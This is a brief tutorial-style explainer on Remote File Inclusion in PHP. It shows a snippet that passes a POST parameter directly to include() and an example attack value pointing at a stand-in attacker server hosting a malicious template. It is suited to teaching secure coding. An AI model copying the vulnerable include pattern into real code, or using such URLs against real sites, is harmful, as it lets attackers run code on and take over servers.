# Remote File Inclusion

## Concept

RFI (Remote File Inclusion) vulnerabilities allow attackers to include and execute remote files on the target server by leveraging user-controllable inputs that specify a remote file URL.

## Attack Principle

When an application processes requests involving external file inclusion, if it fails to strictly validate and filter the input URL, an attacker can input a URL pointing to a malicious file on their server. This causes the server to load and execute the code in the remote malicious file.

## Attack Example

Assume a blog platform permits users to specify a custom template URL via a POST request. The code is as follows:

```php
$templateUrl = $_POST['template_url'];
include($templateUrl);
```

If an attacker sets the `template_url` parameter to `http://attacker-controlled-server/malicious-template.php`, the server will fetch and execute the PHP code in the remote malicious file during processing, enabling the attacker to gain control of the server.
